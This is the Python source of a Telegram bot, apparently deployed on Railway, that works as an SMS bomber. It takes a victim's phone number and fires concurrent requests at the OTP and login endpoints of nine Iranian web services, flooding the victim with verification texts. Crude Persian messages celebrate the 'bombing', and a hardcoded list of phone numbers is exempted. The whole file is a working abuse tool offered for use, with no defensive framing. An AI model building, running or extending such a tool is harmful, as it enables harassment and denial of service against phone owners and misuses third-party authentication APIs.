import os
import telebot
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask

# =========================
# Telegram Bot
# =========================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# =========================
# Sessions & Blocked Numbers
# =========================
user_sessions = {}

blocked_numbers = {
    "09224005771",
    "09182649455",
    "09059250020",
    "09180520256"
}

# =========================
# SUPER-FAST Session for requests
# =========================
session = requests.Session()

# =========================
# SERVICES (Turbo Version)
# =========================
SERVICES = {
    'digikala': lambda num: session.post(
        "https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        timeout=3
    ),

    'divar': lambda num: session.post(
        "https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        timeout=3
    ),

    'olgorock': lambda num: session.post(
        "https://api.algorock.com/api/Auth",
        json={"mobile": num},
        timeout=3
    ),

    'snapp_digital': lambda num: session.post(
        "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        json={"cellphone": num},
        timeout=3
    ),

    'paresh': lambda num: session.post(
        "https://api.paresh.ir/api/user/otp/code/",
        json={"phone_number": num},
        timeout=3
    ),

    'tapsishop': lambda num: session.post(
        "https://tapsi.shop/api/proxy/authCustomer/CreateOtpForRegister",
        json={"user": num},
        timeout=3
    ),

    'talasi': lambda num: session.post(
        "https://api.talasea.ir/api/auth/sentOTP",
        json={"phoneNumber": num},
        timeout=3
    ),

    'filmnet': lambda num: session.get(
        f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
        timeout=3
    ),

    'torob': lambda num: session.get(
        f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
        timeout=3
    ),
}

# =========================
# /start Command
# =========================
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "به بمبر دکتر ERROR خوش اومدی 😈🔥")

# =========================
# /bomb Command
# =========================
@bot.message_handler(commands=['bomb'])
def bomb(message):
    user_sessions[message.chat.id] = "waiting_phone"
    bot.send_message(message.chat.id, "شماره بده بیبی تا بگامش 😈📱:")

# =========================
# Main Handler
# =========================
@bot.message_handler(func=lambda m: True)
def handle_message(message):
    chat_id = message.chat.id

    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
        phone = message.text.strip()

        # 🔒 Check Blocked Numbers
        if phone in blocked_numbers:
            bot.send_message(chat_id, "داداش این شماره خط قرمزه 😎🚫")
            gif = "https://uploadkon.ir/uploads/8d1624_25animation-2025-01-08-01-46-01-7516145351561052176.mp4"
            bot.send_animation(chat_id, gif)
            del user_sessions[chat_id]
            return

        # Start Process
        user_sessions[chat_id] = "processing"

        progress_msg = bot.send_message(chat_id, "در حال ارسال بمباران… 🔥🔥")

        success = 0
        failed = 0

        # =========================
        # TURBO THREAD EXECUTOR
        # =========================
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(service, phone): name for name, service in SERVICES.items()}

            for future in as_completed(futures):
                try:
                    r = future.result()
                    if r.status_code in [200, 201, 202, 204]:
                        success += 1
                    else:
                        failed += 1
                except:
                    failed += 1

        bot.edit_message_text(
            f"🎯 نتیجه بمباران:\n\n✔️ موفق: {success}\n❌ ناموفق: {failed}",
            chat_id,
            progress_msg.message_id
        )

        del user_sessions[chat_id]

# =========================
# Flask (برای Railway)
# =========================
@app.route('/')
def home():
    return "Bot is running 💀🔥"

@app.route('/health')
def health():
    return "OK"

def run_flask():
    app.run(host="0.0.0.0", port=os.environ.get("PORT", 5000))

# =========================
# BOT RUNNER
# =========================
if __name__ == "__main__":
    import threading
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    bot.infinity_polling()
